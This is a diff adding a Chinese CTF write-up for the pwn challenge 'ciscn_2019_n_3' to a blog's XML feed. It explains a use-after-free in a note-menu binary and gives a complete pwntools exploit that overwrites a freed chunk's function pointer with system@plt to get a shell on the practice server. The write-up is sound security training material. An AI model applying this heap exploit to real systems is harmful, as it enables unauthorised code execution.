@@ -4,6 +4,43 @@
   
     
     <entry>
+      <title>ciscn_2019_n_3</title>
+      <link href="/posts/f0e3c24/"/>
+      <url>/posts/f0e3c24/</url>
+      
+        <content type="html"><![CDATA[<h2 id="ciscn-2019-n-3"><a href="#ciscn-2019-n-3" class="headerlink" title="ciscn_2019_n_3"></a>ciscn_2019_n_3</h2><p>首先checksec查看保护机制</p><p><img src="https://pic.imgdb.cn/item/6714f788d29ded1a8cec6b9d.png"></p><p>只开了NX保护和Cnnary got表可用</p><p>ida反编译分析</p><p>主函数是经典的菜单类型题目 </p><p>new函数创建堆</p><p><img src="https://pic.imgdb.cn/item/6714f8c4d29ded1a8cef9407.png"></p><p><img src="https://pic.imgdb.cn/item/6714f8ded29ded1a8cefd588.png"></p><p>接着分析Del函数</p><p><img src="https://pic.imgdb.cn/item/6714f905d29ded1a8cf039fe.png"></p><p>调用堆地址＋4处的函数</p><p>分别查看rec_int_free与rec_str_free函数</p><p><img src="https://pic.imgdb.cn/item/6714f9a1d29ded1a8cf1e3a5.png"></p><p><img src="https://pic.imgdb.cn/item/6714f9bbd29ded1a8cf22322.png"></p><p>free后没有将指针置空存在UAF漏洞</p><p>先申请两个chunk后free掉两个chunk</p><p>文件中有system函数   申请chunk时会先申请0xc大小的chunk</p><p>free之后申请0xc大小的chunk 内容写入  <strong><code>b&#39;bash&#39; + p32(elf.plt[&#39;system&#39;])</code></strong></p><p>即可执行拿到shell</p><p>exp如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">content = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> content == <span class="number">0</span>:</span><br><span class="line">    p = process(<span class="string">&#x27;./ciscn_2019_n_3&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">25046</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_n_3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> length: p.recv(length)</span><br><span class="line">ru = <span class="keyword">lambda</span> x : p.recvuntil(x)</span><br><span class="line">s = <span class="keyword">lambda</span> x : p.send(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> delim,x : p.sendafter(delim,x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x : p.sendline(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> delim,x : p.sendlineafter(delim,x)</span><br><span class="line">itr = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line">leak = <span class="keyword">lambda</span> addr : log.success(<span class="string">&quot;&#123;:x&#125;&quot;</span>.<span class="built_in">format</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice</span>):</span><br><span class="line">    ru(<span class="string">b&#x27;CNote &gt;&#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">index, <span class="built_in">type</span>, size, payload</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">type</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == <span class="number">2</span>:</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(payload))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Del</span>(<span class="params">index</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">leak = <span class="string">b&#x27;bash&#x27;</span> + p32(system_plt)</span><br><span class="line">new(<span class="number">0</span>, <span class="number">2</span>, <span class="number">0x10</span>, <span class="string">b&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line">new(<span class="number">1</span>, <span class="number">2</span>, <span class="number">0x10</span>, <span class="string">b&#x27;bbbbbbbb&#x27;</span>)</span><br><span class="line">Del(<span class="number">0</span>)</span><br><span class="line">Del(<span class="number">1</span>)</span><br><span class="line">new(<span class="number">2</span>, <span class="number">2</span>, <span class="number">0xc</span>, leak)</span><br><span class="line">Del(<span class="number">0</span>)</span><br><span class="line">p.interactive() </span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> WriteUP </category>
+          
+          <category> 堆 </category>
+          
+          <category> CTF </category>
+          
+          <category> PWN </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CTF </tag>
+            
+            <tag> PWN </tag>
+            
+            <tag> WriteUP </tag>
+            
+            <tag> 堆 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>[安洵杯 2019] easy misc</title>
       <link href="/posts/b88b8704/"/>
       <url>/posts/b88b8704/</url>
